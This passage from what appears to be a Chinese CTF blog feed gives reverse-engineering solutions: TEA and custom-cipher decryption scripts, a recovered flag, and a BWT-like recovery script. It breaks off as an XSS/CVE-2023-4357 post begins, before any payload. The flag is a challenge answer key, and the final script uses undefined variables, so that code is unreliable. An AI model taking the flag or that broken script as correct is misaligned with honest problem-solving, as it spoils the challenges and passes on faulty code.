src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-01%2002.19.40.png" alt="截屏2024-01-01 02.19.40"></p><p>简单分析一下，<code>*(input+36)</code>作为一个索引，将输入分为4个部分，而在之前的函数输入中我们可以得知flag应该是32位，那么这里就是8字节一组的加密，结合for循环的第一句，也验证了这个猜想。</p><p>跟入<code>sub_8080720</code></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-01%2002.22.10.png" alt="截屏2024-01-01 02.22.10"></p><p>这里面<code>sub_8080360</code>是在做数据准备，与输入无关。</p><p>经过调试可以将这段加密等价转为如下python代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">ROL</span>(<span class="hljs-params">value,count</span>):<br>     <span class="hljs-keyword">return</span> ((value &lt;&lt; count) &amp; <span class="hljs-number">0xffffffff</span>) | (value &gt;&gt; (<span class="hljs-number">0x20</span> - count))<br><br><br>table = [<span class="hljs-number">67438087</span>, <span class="hljs-number">66051</span>, <span class="hljs-number">202182159</span>, <span class="hljs-number">134810123</span>, <span class="hljs-number">3443517467</span>, <span class="hljs-number">3619968119</span>, <span class="hljs-number">2671678006</span>, <span class="hljs-number">17297799</span>, <span class="hljs-number">4187212673</span>, <span class="hljs-number">3212056172</span>, <span class="hljs-number">3659105319</span>, <span class="hljs-number">436579327</span>, <span class="hljs-number">2466768356</span>, <span class="hljs-number">3414888005</span>, <span class="hljs-number">812513269</span>, <span class="hljs-number">2905604503</span>, <span class="hljs-number">2860953686</span>, <span class="hljs-number">1150444474</span>, <span class="hljs-number">1067728923</span>, <span class="hljs-number">507640087</span>, <span class="hljs-number">3335200381</span>, <span class="hljs-number">418057594</span>, <span class="hljs-number">3572254720</span>, <span class="hljs-number">3028744491</span>, <span class="hljs-number">2268592627</span>, <span class="hljs-number">1985887525</span>, <span class="hljs-number">3678221623</span>, <span class="hljs-number">3997455659</span>, <span class="hljs-number">298895692</span>, <span class="hljs-number">2606783435</span>, <span class="hljs-number">2419824819</span>, <span class="hljs-number">616754851</span>, <span class="hljs-number">2305691810</span>, <span class="hljs-number">575140032</span>, <span class="hljs-number">3092143274</span>, <span class="hljs-number">2368472304</span>, <span class="hljs-number">1002931244</span>, <span class="hljs-number">441505286</span>, <span class="hljs-number">1235325308</span>, <span class="hljs-number">2115810572</span>, <span class="hljs-number">4230461478</span>, <span class="hljs-number">1608376252</span>, <span class="hljs-number">3725575172</span>, <span class="hljs-number">2998077703</span>]<br><br>v1 = <span class="hljs-number">0x61616161</span><br>v2 = <span class="hljs-number">0x62626262</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">44</span>):<br>    v = v1<br>    v6 = ROL(v1,<span class="hljs-number">1</span>)<br>    v7 = ROL(v1,<span class="hljs-number">8</span>) &amp; v6<br><br>    v1 = v7 ^ ROL(v1,<span class="hljs-number">2</span>) ^ v2 ^ table[i]<br>    v2 = v<br></code></pre></td></tr></table></figure><p>这里的<code>v1,v2</code>代表了8字节flag的低4字节和高4字节，<code>table</code>则是由函数<code>sub_8080360</code>得到</p><p>经过<code>sub_8080720</code>后，则是进入<code>sub_8080100</code>，这是个很明显的TEA算法</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-01%2002.25.41.png"></p><p>唯一需要注意的是循环轮次与之前的索引有关</p><p>现在可以得到完整的加密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ROL</span>(<span class="hljs-params">value,count</span>):<br>     <span class="hljs-keyword">return</span> ((value &lt;&lt; count) &amp; <span class="hljs-number">0xffffffff</span>) | (value &gt;&gt; (<span class="hljs-number">0x20</span> - count))<br><br><br>table = [<span class="hljs-number">67438087</span>, <span class="hljs-number">66051</span>, <span class="hljs-number">202182159</span>, <span class="hljs-number">134810123</span>, <span class="hljs-number">3443517467</span>, <span class="hljs-number">3619968119</span>, <span class="hljs-number">2671678006</span>, <span class="hljs-number">17297799</span>, <span class="hljs-number">4187212673</span>, <span class="hljs-number">3212056172</span>, <span class="hljs-number">3659105319</span>, <span class="hljs-number">436579327</span>, <span class="hljs-number">2466768356</span>, <span class="hljs-number">3414888005</span>, <span class="hljs-number">812513269</span>, <span class="hljs-number">2905604503</span>, <span class="hljs-number">2860953686</span>, <span class="hljs-number">1150444474</span>, <span class="hljs-number">1067728923</span>, <span class="hljs-number">507640087</span>, <span class="hljs-number">3335200381</span>, <span class="hljs-number">418057594</span>, <span class="hljs-number">3572254720</span>, <span class="hljs-number">3028744491</span>, <span class="hljs-number">2268592627</span>, <span class="hljs-number">1985887525</span>, <span class="hljs-number">3678221623</span>, <span class="hljs-number">3997455659</span>, <span class="hljs-number">298895692</span>, <span class="hljs-number">2606783435</span>, <span class="hljs-number">2419824819</span>, <span class="hljs-number">616754851</span>, <span class="hljs-number">2305691810</span>, <span class="hljs-number">575140032</span>, <span class="hljs-number">3092143274</span>, <span class="hljs-number">2368472304</span>, <span class="hljs-number">1002931244</span>, <span class="hljs-number">441505286</span>, <span class="hljs-number">1235325308</span>, <span class="hljs-number">2115810572</span>, <span class="hljs-number">4230461478</span>, <span class="hljs-number">1608376252</span>, <span class="hljs-number">3725575172</span>, <span class="hljs-number">2998077703</span>]<br><br>v1 = <span class="hljs-number">0x61616161</span><br>v2 = <span class="hljs-number">0x62626262</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">44</span>):<br>    v = v1<br>    v6 = ROL(v1,<span class="hljs-number">1</span>)<br>    v7 = ROL(v1,<span class="hljs-number">8</span>) &amp; v6<br><br>    v1 = v7 ^ ROL(v1,<span class="hljs-number">2</span>) ^ v2 ^ table[i]<br>    v2 = v<br><br>v1 = c_uint32(v1)<br>v2 = c_uint32(v2)<br>delta = <span class="hljs-number">0x10325476</span><br><span class="hljs-built_in">sum</span> = c_uint32(<span class="hljs-number">0</span>)<br>key = [<span class="hljs-number">0x3020100</span>,<span class="hljs-number">0x7060504</span>,<span class="hljs-number">0xb0a0908</span>,<span class="hljs-number">0xf0e0d0c</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>): <span class="hljs-comment"># 总循环次数会变，是2的n次幂</span><br>    v2.value += (((v1.value &gt;&gt; <span class="hljs-number">5</span>) ^ (v1.value &lt;&lt; <span class="hljs-number">4</span>)) + v1.value) ^ (key[<span class="hljs-built_in">sum</span>.value &amp; <span class="hljs-number">3</span>] + <span class="hljs-built_in">sum</span>.value)<br>    <span class="hljs-built_in">sum</span>.value += delta<br>    v1.value += (((v2.value &gt;&gt; <span class="hljs-number">5</span>) ^ (v2.value &lt;&lt; <span class="hljs-number">4</span>)) + v2.value) ^ (key[(<span class="hljs-built_in">sum</span>.value &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>] + <span class="hljs-built_in">sum</span>.value)<br>    <br></code></pre></td></tr></table></figure><p>据此写出逆运算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>enc=  [<span class="hljs-number">4260741734</span>, <span class="hljs-number">2050130566</span>, <span class="hljs-number">3465822212</span>, <span class="hljs-number">1574996700</span>, <span class="hljs-number">2800008458</span>, <span class="hljs-number">382381532</span>, <span class="hljs-number">332230412</span>, <span class="hljs-number">443930934</span>]<br>table = [<span class="hljs-number">67438087</span>, <span class="hljs-number">66051</span>, <span class="hljs-number">202182159</span>, <span class="hljs-number">134810123</span>, <span class="hljs-number">3443517467</span>, <span class="hljs-number">3619968119</span>, <span class="hljs-number">2671678006</span>, <span class="hljs-number">17297799</span>, <span class="hljs-number">4187212673</span>, <span class="hljs-number">3212056172</span>, <span class="hljs-number">3659105319</span>, <span class="hljs-number">436579327</span>, <span class="hljs-number">2466768356</span>, <span class="hljs-number">3414888005</span>, <span class="hljs-number">812513269</span>, <span class="hljs-number">2905604503</span>, <span class="hljs-number">2860953686</span>, <span class="hljs-number">1150444474</span>, <span class="hljs-number">1067728923</span>, <span class="hljs-number">507640087</span>, <span class="hljs-number">3335200381</span>, <span class="hljs-number">418057594</span>, <span class="hljs-number">3572254720</span>, <span class="hljs-number">3028744491</span>, <span class="hljs-number">2268592627</span>, <span class="hljs-number">1985887525</span>, <span class="hljs-number">3678221623</span>, <span class="hljs-number">3997455659</span>, <span class="hljs-number">298895692</span>, <span class="hljs-number">2606783435</span>, <span class="hljs-number">2419824819</span>, <span class="hljs-number">616754851</span>, <span class="hljs-number">2305691810</span>, <span class="hljs-number">575140032</span>, <span class="hljs-number">3092143274</span>, <span class="hljs-number">2368472304</span>, <span class="hljs-number">1002931244</span>, <span class="hljs-number">441505286</span>, <span class="hljs-number">1235325308</span>, <span class="hljs-number">2115810572</span>, <span class="hljs-number">4230461478</span>, <span class="hljs-number">1608376252</span>, <span class="hljs-number">3725575172</span>, <span class="hljs-number">2998077703</span>]<br>table = table[::-<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ROL</span>(<span class="hljs-params">value,count</span>):<br>     <span class="hljs-keyword">return</span> ((value &lt;&lt; count) &amp; <span class="hljs-number">0xffffffff</span>) | (value &gt;&gt; (<span class="hljs-number">0x20</span> - count))<br><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    v1 = c_uint32(enc[<span class="hljs-number">2</span>*k+<span class="hljs-number">1</span>])<br>    v2 = c_uint32(enc[<span class="hljs-number">2</span>*k])<br>    delta = <span class="hljs-number">0x10325476</span><br>    <span class="hljs-built_in">sum</span> = c_uint32(delta * (<span class="hljs-number">2</span>**(k+<span class="hljs-number">1</span>)))<br>    key = [<span class="hljs-number">0x3020100</span>,<span class="hljs-number">0x7060504</span>,<span class="hljs-number">0xb0a0908</span>,<span class="hljs-number">0xf0e0d0c</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**(k+<span class="hljs-number">1</span>)):<br>        v1.value -= (((v2.value &gt;&gt; <span class="hljs-number">5</span>) ^ (v2.value &lt;&lt; <span class="hljs-number">4</span>)) + v2.value) ^ (key[(<span class="hljs-built_in">sum</span>.value &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>] + <span class="hljs-built_in">sum</span>.value)<br>        <span class="hljs-built_in">sum</span>.value -= delta<br>        v2.value -= (((v1.value &gt;&gt; <span class="hljs-number">5</span>) ^ (v1.value &lt;&lt; <span class="hljs-number">4</span>)) + v1.value) ^ (key[<span class="hljs-built_in">sum</span>.value &amp; <span class="hljs-number">3</span>] + <span class="hljs-built_in">sum</span>.value)<br><br>    v1 = v1.value <br>    v2 = v2.value<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">44</span>):<br>        v = v2<br>        v6 = ROL(v2,<span class="hljs-number">1</span>)<br>        v7 = ROL(v2,<span class="hljs-number">8</span>) &amp; v6<br><br>        v2 = v7 ^ ROL(v2,<span class="hljs-number">2</span>) ^ v1 ^ table[i]<br><br>        v1 = v<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(((v1 &lt;&lt; (i*<span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xff000000</span>) &gt;&gt;<span class="hljs-number">24</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(((v2 &lt;&lt; (i*<span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xff000000</span>) &gt;&gt;<span class="hljs-number">24</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)<br> <br><span class="hljs-comment"># mM7pJIobsCTQPO6R0g-L8kFExhYuivBN</span><br></code></pre></td></tr></table></figure><h2 id="Jump"><a href="#Jump" class="headerlink" title="Jump"></a>Jump</h2><p>考点就是<code>setjmp()</code>和<code>longjmp()</code>的配合，这两个函数可以在函数间实现类似<code>goto</code>的跳跃。</p><p>简单说就是<code>setjmp</code>会设置一个缓存点，需要一个<code>jmp_buf</code>参数来保存上下文信息，并且返回0零值</p><p><code>longjmp</code>需要一个<code>jmp_buf</code>参数来知晓要去哪个缓存点，还需要一个<code>val</code>参数来告诉要返回什么值。这里要注意的是<code>longjmp</code>函数不返回，而是直接从<code>setjmp</code>返回，返回值就是<code>val</code></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-13%2016.16.44.png"></p><p>整体的逻辑都比较简单，这里还用<code>setjmp</code>和<code>longjmp</code>做了循环操作。</p><p>通过调试可以知道输入0x22个字符，然后每次循环左移1位得到二维数组给buffer2，比如输入<code>985236147adgjlqwesxzcvbnmfuiopvx</code>,就会得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;\x02985236147adgjlqwesxzcvbnmfuiopvx\x03&#x27;</span><br><span class="hljs-string">b&#x27;985236147adgjlqwesxzcvbnmfuiopvx\x03\x02&#x27;</span><br><span class="hljs-string">b&#x27;85236147adgjlqwesxzcvbnmfuiopvx\x03\x029&#x27;</span><br><span class="hljs-string">b&#x27;5236147adgjlqwesxzcvbnmfuiopvx\x03\x0298&#x27;</span><br><span class="hljs-string">b&#x27;236147adgjlqwesxzcvbnmfuiopvx\x03\x02985&#x27;</span><br><span class="hljs-string">b&#x27;36147adgjlqwesxzcvbnmfuiopvx\x03\x029852&#x27;</span><br><span class="hljs-string">b&#x27;6147adgjlqwesxzcvbnmfuiopvx\x03\x0298523&#x27;</span><br><span class="hljs-string">b&#x27;147adgjlqwesxzcvbnmfuiopvx\x03\x02985236&#x27;</span><br><span class="hljs-string">b&#x27;47adgjlqwesxzcvbnmfuiopvx\x03\x029852361&#x27;</span><br><span class="hljs-string">b&#x27;7adgjlqwesxzcvbnmfuiopvx\x03\x0298523614&#x27;</span><br><span class="hljs-string">b&#x27;adgjlqwesxzcvbnmfuiopvx\x03\x02985236147&#x27;</span><br><span class="hljs-string">b&#x27;dgjlqwesxzcvbnmfuiopvx\x03\x02985236147a&#x27;</span><br><span class="hljs-string">b&#x27;gjlqwesxzcvbnmfuiopvx\x03\x02985236147ad&#x27;</span><br><span class="hljs-string">b&#x27;jlqwesxzcvbnmfuiopvx\x03\x02985236147adg&#x27;</span><br><span class="hljs-string">b&#x27;lqwesxzcvbnmfuiopvx\x03\x02985236147adgj&#x27;</span><br><span class="hljs-string">b&#x27;qwesxzcvbnmfuiopvx\x03\x02985236147adgjl&#x27;</span><br><span class="hljs-string">b&#x27;wesxzcvbnmfuiopvx\x03\x02985236147adgjlq&#x27;</span><br><span class="hljs-string">b&#x27;esxzcvbnmfuiopvx\x03\x02985236147adgjlqw&#x27;</span><br><span class="hljs-string">b&#x27;sxzcvbnmfuiopvx\x03\x02985236147adgjlqwe&#x27;</span><br><span class="hljs-string">b&#x27;xzcvbnmfuiopvx\x03\x02985236147adgjlqwes&#x27;</span><br><span class="hljs-string">b&#x27;zcvbnmfuiopvx\x03\x02985236147adgjlqwesx&#x27;</span><br><span class="hljs-string">b&#x27;cvbnmfuiopvx\x03\x02985236147adgjlqwesxz&#x27;</span><br><span class="hljs-string">b&#x27;vbnmfuiopvx\x03\x02985236147adgjlqwesxzc&#x27;</span><br><span class="hljs-string">b&#x27;bnmfuiopvx\x03\x02985236147adgjlqwesxzcv&#x27;</span><br><span class="hljs-string">b&#x27;nmfuiopvx\x03\x02985236147adgjlqwesxzcvb&#x27;</span><br><span class="hljs-string">b&#x27;mfuiopvx\x03\x02985236147adgjlqwesxzcvbn&#x27;</span><br><span class="hljs-string">b&#x27;fuiopvx\x03\x02985236147adgjlqwesxzcvbnm&#x27;</span><br><span class="hljs-string">b&#x27;uiopvx\x03\x02985236147adgjlqwesxzcvbnmf&#x27;</span><br><span class="hljs-string">b&#x27;iopvx\x03\x02985236147adgjlqwesxzcvbnmfu&#x27;</span><br><span class="hljs-string">b&#x27;opvx\x03\x02985236147adgjlqwesxzcvbnmfui&#x27;</span><br><span class="hljs-string">b&#x27;pvx\x03\x02985236147adgjlqwesxzcvbnmfuio&#x27;</span><br><span class="hljs-string">b&#x27;vx\x03\x02985236147adgjlqwesxzcvbnmfuiop&#x27;</span><br><span class="hljs-string">b&#x27;x\x03\x02985236147adgjlqwesxzcvbnmfuiopv&#x27;</span><br><span class="hljs-string">b&#x27;\x03\x02985236147adgjlqwesxzcvbnmfuiopvx&#x27;</span><br></code></pre></td></tr></table></figure><p>这里的<code>\x02</code>和<code>\x03</code>是程序加的。</p><p>然后函数<code>sub_401F62</code>则根据这个二维数组的第一列进行排序，得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;\x02985236147adgjlqwesxzcvbnmfuiopvx\x03&#x27;</span><br><span class="hljs-string">b&#x27;\x03\x02985236147adgjlqwesxzcvbnmfuiopvx&#x27;</span><br><span class="hljs-string">b&#x27;147adgjlqwesxzcvbnmfuiopvx\x03\x02985236&#x27;</span><br><span class="hljs-string">b&#x27;236147adgjlqwesxzcvbnmfuiopvx\x03\x02985&#x27;</span><br><span class="hljs-string">b&#x27;36147adgjlqwesxzcvbnmfuiopvx\x03\x029852&#x27;</span><br><span class="hljs-string">b&#x27;47adgjlqwesxzcvbnmfuiopvx\x03\x029852361&#x27;</span><br><span class="hljs-string">b&#x27;5236147adgjlqwesxzcvbnmfuiopvx\x03\x0298&#x27;</span><br><span class="hljs-string">b&#x27;6147adgjlqwesxzcvbnmfuiopvx\x03\x0298523&#x27;</span><br><span class="hljs-string">b&#x27;7adgjlqwesxzcvbnmfuiopvx\x03\x0298523614&#x27;</span><br><span class="hljs-string">b&#x27;85236147adgjlqwesxzcvbnmfuiopvx\x03\x029&#x27;</span><br><span class="hljs-string">b&#x27;985236147adgjlqwesxzcvbnmfuiopvx\x03\x02&#x27;</span><br><span class="hljs-string">b&#x27;adgjlqwesxzcvbnmfuiopvx\x03\x02985236147&#x27;</span><br><span class="hljs-string">b&#x27;bnmfuiopvx\x03\x02985236147adgjlqwesxzcv&#x27;</span><br><span class="hljs-string">b&#x27;cvbnmfuiopvx\x03\x02985236147adgjlqwesxz&#x27;</span><br><span class="hljs-string">b&#x27;dgjlqwesxzcvbnmfuiopvx\x03\x02985236147a&#x27;</span><br><span class="hljs-string">b&#x27;esxzcvbnmfuiopvx\x03\x02985236147adgjlqw&#x27;</span><br><span class="hljs-string">b&#x27;fuiopvx\x03\x02985236147adgjlqwesxzcvbnm&#x27;</span><br><span class="hljs-string">b&#x27;gjlqwesxzcvbnmfuiopvx\x03\x02985236147ad&#x27;</span><br><span class="hljs-string">b&#x27;iopvx\x03\x02985236147adgjlqwesxzcvbnmfu&#x27;</span><br><span class="hljs-string">b&#x27;jlqwesxzcvbnmfuiopvx\x03\x02985236147adg&#x27;</span><br><span class="hljs-string">b&#x27;lqwesxzcvbnmfuiopvx\x03\x02985236147adgj&#x27;</span><br><span class="hljs-string">b&#x27;mfuiopvx\x03\x02985236147adgjlqwesxzcvbn&#x27;</span><br><span class="hljs-string">b&#x27;nmfuiopvx\x03\x02985236147adgjlqwesxzcvb&#x27;</span><br><span class="hljs-string">b&#x27;opvx\x03\x02985236147adgjlqwesxzcvbnmfui&#x27;</span><br><span class="hljs-string">b&#x27;pvx\x03\x02985236147adgjlqwesxzcvbnmfuio&#x27;</span><br><span class="hljs-string">b&#x27;qwesxzcvbnmfuiopvx\x03\x02985236147adgjl&#x27;</span><br><span class="hljs-string">b&#x27;sxzcvbnmfuiopvx\x03\x02985236147adgjlqwe&#x27;</span><br><span class="hljs-string">b&#x27;uiopvx\x03\x02985236147adgjlqwesxzcvbnmf&#x27;</span><br><span class="hljs-string">b&#x27;vbnmfuiopvx\x03\x02985236147adgjlqwesxzc&#x27;</span><br><span class="hljs-string">b&#x27;vx\x03\x02985236147adgjlqwesxzcvbnmfuiop&#x27;</span><br><span class="hljs-string">b&#x27;wesxzcvbnmfuiopvx\x03\x02985236147adgjlq&#x27;</span><br><span class="hljs-string">b&#x27;x\x03\x02985236147adgjlqwesxzcvbnmfuiopv&#x27;</span><br><span class="hljs-string">b&#x27;xzcvbnmfuiopvx\x03\x02985236147adgjlqwes&#x27;</span><br><span class="hljs-string">b&#x27;zcvbnmfuiopvx\x03\x02985236147adgjlqwesx&#x27;</span><br></code></pre></td></tr></table></figure><p>再以这个二维数组的最后一列为密文。</p><p>那么恢复也比较简单，因为每一行首尾两个一定是相连的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">cipher = [ <span class="hljs-number">3</span>, <span class="hljs-number">106</span>, <span class="hljs-number">109</span>,  <span class="hljs-number">71</span>, <span class="hljs-number">110</span>,  <span class="hljs-number">95</span>,  <span class="hljs-number">61</span>, <span class="hljs-number">117</span>,  <span class="hljs-number">97</span>,  <span class="hljs-number">83</span>, <span class="hljs-number">90</span>,  <span class="hljs-number">76</span>, <span class="hljs-number">118</span>,  <span class="hljs-number">78</span>,  <span class="hljs-number">52</span>, <span class="hljs-number">119</span>,  <span class="hljs-number">70</span>, <span class="hljs-number">120</span>,  <span class="hljs-number">69</span>,  <span class="hljs-number">54</span>, <span class="hljs-number">82</span>,  <span class="hljs-number">43</span>, <span class="hljs-number">112</span>,   <span class="hljs-number">2</span>,  <span class="hljs-number">68</span>,  <span class="hljs-number">50</span>, <span class="hljs-number">113</span>,  <span class="hljs-number">86</span>,  <span class="hljs-number">49</span>,  <span class="hljs-number">67</span>, <span class="hljs-number">66</span>,  <span class="hljs-number">84</span>,  <span class="hljs-number">99</span>, <span class="hljs-number">107</span>]<br><br>sort_ed = [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">43</span>, <span class="hljs-number">49</span>, <span class="hljs-number">50</span>, <span class="hljs-number">52</span>, <span class="hljs-number">54</span>, <span class="hljs-number">61</span>, <span class="hljs-number">66</span>, <span class="hljs-number">67</span>, <span class="hljs-number">68</span>, <span class="hljs-number">69</span>, <span class="hljs-number">70</span>, <span class="hljs-number">71</span>, <span class="hljs-number">76</span>, <span class="hljs-number">78</span>, <span class="hljs-number">82</span>, <span class="hljs-number">83</span>, <span class="hljs-number">84</span>, <span class="hljs-number">86</span>, <span class="hljs-number">90</span>, <span class="hljs-number">95</span>, <span class="hljs-number">97</span>, <span class="hljs-number">99</span>, <span class="hljs-number">106</span>, <span class="hljs-number">107</span>, <span class="hljs-number">109</span>, <span class="hljs-number">110</span>, <span class="hljs-number">112</span>, <span class="hljs-number">113</span>, <span class="hljs-number">117</span>, <span class="hljs-number">118</span>, <span class="hljs-number">119</span>, <span class="hljs-number">120</span>]<br><span class="hljs-built_in">print</span>(t)<br><br>cur = q.index(<span class="hljs-number">2</span>)<br>ans = []<br><br><span class="hljs-keyword">while</span> q[cur]!=<span class="hljs-number">3</span>:<br>    nxt = sort_ed[cur]<br>    ans.append(nxt)<br>    cur = cipher.index(nxt)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(ans))<br><br></code></pre></td></tr></table></figure><p><code>cipher</code>就是排序后的最后一列，而<code>sort_ed</code>就是将<code>cipher</code>再进行排序，因为<code>cipher</code>包含了所有flag，那么就得到每一行的第一列。再只要一一对应即可。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>题目复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackerGame-XSS &amp; TPCTF 2023 &amp; CVE-2023-4357</title>
    <link href="/2023/11/30/TPCTF_2023_CVE-2023-4357/"/>
    <url>/2023/11/30/TPCTF_2023_CVE-2023-4357/</url>
    
    <content type="html"><![CDATA[<h1 id="HackerGame-XSS-amp-CVE-2023-4357-amp-TPCTF-2023"><a href="#HackerGame-XSS-amp-CVE-2023-4357-amp-TPCTF-2023" class="headerlink" title="HackerGame-XSS &amp; CVE-2023-4357 &amp; TPCTF 2023"></a>HackerGame-XSS &amp; CVE-2023-4357 &amp; TPCTF 2023</h1><p>记录一些个复现</p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次TPCTF出了两道CVE-2023-4357的题目，而且还借用了<code>HackerGame2023</code>的中<code>微积分练习题</code>的一个bot脚本。于是正好借此机会，复现一下HG的这道题目，同时也学习一下这个CVE的利用姿势</p><h2 id="微积分计算小练习-2-0"><a href="#微积分计算小练习-2-0" class="headerlink" title="微积分计算小练习 2.0"></a>微积分计算小练习 2.0</h2><h3 id="评论界面分析"><a href="#评论界面分析" class="headerlink" title="评论界面分析"></a>评论界面分析</h3><p>随便输入那几道微积分的答案后会进入一个评论界面</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-11-29%2023.08.48.png"></p><p>在这里输入的评论会被拼接进html里面，f12查看源码可以看到如下的语句</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 